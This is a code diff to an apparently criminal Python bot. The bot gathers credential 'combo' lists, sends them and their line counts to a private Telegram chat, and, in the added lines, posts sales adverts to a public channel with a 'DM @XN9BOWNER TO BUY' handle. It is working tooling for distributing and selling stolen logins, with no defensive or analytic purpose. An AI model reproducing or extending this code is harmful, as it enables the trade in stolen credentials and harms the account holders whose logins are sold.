@@ -26,7 +26,8 @@ CHANNEL_ID         = int(os.environ["CHANNEL_ID"])
 NEW_CHANNEL_ID     = int(os.environ["NEW_CHANNEL_ID"])
 CONTENT_CHANNEL_ID = int(os.environ["CONTENT_CHANNEL_ID"])
 TELEGRAM_TOKEN     = os.environ["TELEGRAM_TOKEN"]
-TELEGRAM_CHAT      = os.environ["TELEGRAM_CHAT"]
+TELEGRAM_CHAT        = os.environ["TELEGRAM_CHAT"]
+TELEGRAM_PUBLIC_CHAT = os.environ["TELEGRAM_PUBLIC_CHAT"]
 OWNER_ID           = int(os.environ["OWNER_ID"])
 
 CHECK_INTERVAL   = 30
@@ -370,13 +371,19 @@ async def monitor_loop():
                         )
                         await send_telegram_file(tg_header + "\n".join(all_creds), filename)
 
-                        # Send combo count message
-                        count_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+                        # Send combo count to private channel
                         async with aiohttp.ClientSession() as sess:
-                            await sess.post(count_url, json={
-                                "chat_id": TELEGRAM_CHAT,
-                                "text": f"{len(all_creds)} COMBO FILE"
-                            })
+                            await sess.post(
+                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                                json={"chat_id": TELEGRAM_CHAT, "text": f"{len(all_creds)} COMBO FILE"}
+                            )
+                            # Send update to public channel
+                            pub_text = f"PRIVATE CLOUD UPDATED !\n-File name: {filename}\n-Lines: {len(all_creds)}\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
+                            await sess.post(
+                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                                json={"chat_id": TELEGRAM_PUBLIC_CHAT, "text": pub_text}
+                            )
+
 
                     else:
                         log.info("Nothing to post to content channel")
